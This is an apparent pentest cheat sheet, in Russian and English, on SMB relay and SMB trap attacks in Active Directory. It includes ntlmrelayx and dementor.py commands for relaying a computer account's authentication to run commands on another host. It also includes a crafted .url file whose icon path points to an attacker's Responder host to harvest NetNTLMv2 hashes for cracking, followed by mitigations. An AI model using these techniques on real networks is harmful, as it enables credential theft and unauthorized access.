# SMB Attacks

## SMB Relay

This attack uses the Responder toolkit to **capture SMB authentication sessions** on an internal network, and **relays** them to a **target machine**. If the authentication **session is successful**, it will automatically drop you into a **system** **shell**.

### Example

#### Описание

Источник: [https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack/](https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack/)

Эта атака возможна в сценариях, когда учетной записи компьютера был назначен административный доступ к другому компьютеру в Active Directory при следующих условиях:

1. Компьютер A и Компьютер B заведены в домен, при этом Компьютер A имеет привилегии админа на Компьютере B
2. Компьютер A как **клинт** не требует SMB signing и поддерживает NetNTLMv1 или NetNTLMv2 аутентификацию (по умолчанию)
3. На Компьютере A запущен сервис диспетчер печати (printer spooler service, по умолчанию)
4. У атакующего есть учетка **непривилегированного** пользователя в домене
5. Компьютер B как сервер не требует SMB signing (по умолчанию)

В этих условиях атакующий может получить доступ к Компьютеру B, взаимодействуя со службой диспетчера печати на Компьютере A и заставляя его пройти аутентификацию на SMB-сервере, контролируемом атакующим. Затем можно выполнить атаку SMB Relay для компрометации Компьютера B с помощью такого инструмента как ntlmrelayx (часть пакета [Impacket](https://github.com/SecureAuthCorp/impacket)).

#### Идентификация

Идентифицировать эту уязвимость можно с помощь следующего запроса Cipher в BloodHound:

```
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
MATCH(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(c2:Computer) RETURN c1.name,c2.name

```

#### Эксплуатация

Tools:\
ntlmrelayx ([Impacket](https://github.com/SecureAuthCorp/impacket))\
[dementor.py](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc) — скрипт для взаимодействия с сервером очереди печати (использует технику "printer bug")

Чтобы воспользоваться этой уязвимостью, мы должны сначала запустить ntlmrelayx для нацеливания на соответствующий хост. В этом примере мы выполнили ntlmrelayx для компьютера B (192.168.184.136). Ниже приведен пример команды.

```
# python3 examples/ntlmrelayx.py -smb2support -t smb://192.168.184.136 -c 'whoami /all' -debug
```

Следующим шагом является запуск аутентификации с компьютера A на SMB-сервере, контролируемом злоумышленником. Для этого запускаем скрипт dementor.py. Пример команды для запуска этого инструмента приведен ниже (компьютер A - 192.168.184.135, а хост злоумышленника - 192.168.184.141). В этом примере команды мы используем учетные данные пользователя домена; однако эти учетные данные предназначены для стандартной учетной записи пользователя домена без административного доступа ни к одному из узлов.

```
$ python dementor.py -u jsmith -p Spring2020 -d CONTOSO.LOCAL 192.168.184.141 192.168.184.135
```

Затем компьютер A аутентифицируется на SMB-сервере злоумышленника, на котором запущен ntlmrelayx, и попытка аутентификации передается на компьютер B. Инструмент ntlmrelayx затем выполняет команду whoami и получает результат.&#x20;

#### Mitigations

* Не должно быть административных прав у одного компьютера на другом
* Должен быть включен SMB signing или SMB encryption для защиты от атак перепосылки (relay)
* Сервис printer spooler должен быть отключен на всех компьютерах в сети

## SMB Trap

### Почему это работает

The Windows library URLMon.dll automatically try to authenticaticate to the host when a page tries to access some contect via SMB, for example: `img src="\\10.10.10.10\path\image.jpg"`

This happens with the funcions:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

Which are used by some browsers and tools (like Skype)

### Пример

Допустим, мы имеем права на запись в SMB-папку my-fs. Помещаем файл sysinfo.url в корневую директорию:

```
/usr/bin/smbclient \\\\192.168.1.4\\my-fs -U someUser@domain.local <password>
smb> ls
.
..
sysinfo.url
```

Содержимое файла sysinfo.url:

```
[DEFAULT]
BASEURL=https://host.notexists/
[{000214A0-0000-0000-C000-000000000046}]
Prop3=19,2
[InternetShortcut]
URL=http://host.noteexists/
IDList=
IconFile=\\192.168.1.67\%ComputerName%\%UserDomain%\%LogonServer%\%UserName%\%HomePath%
IconIndex=0
HotKey=0
```

Где, 192.168.1.67 — наш IP, где мы подняли Responder.

При открытии папки приложением Проводник винда пытается загрузить иконку по пути, указанному в параметре IconFile. В итоге получаем хеши паролей NetNTLMv2. Хеши пробуем перебрать по словарю.
